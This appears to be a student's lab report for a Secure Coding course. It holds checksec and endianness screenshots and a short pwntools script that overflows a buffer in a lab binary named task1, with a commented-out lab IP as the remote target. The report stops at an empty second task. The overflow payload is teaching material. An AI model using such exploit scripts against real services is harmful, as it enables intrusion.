Colby Crutcher

Secure Coding

Lab 5

1. 

- Edianness: 

![](image-1.png)


- Checksec:

![](image-2.png)

Code to overflow:

```c
from pwn import *

# Start program
io = process('./task1')
#io = remote('10.202.12.82', 11111)

# Send string to overflow buffer
io.sendlineafter(b':', b'AAAAAAAAAAAA\0')

# Receive output
print(io.recvall().decode())

```

![Output for overflow Task 1](image.png)



2. 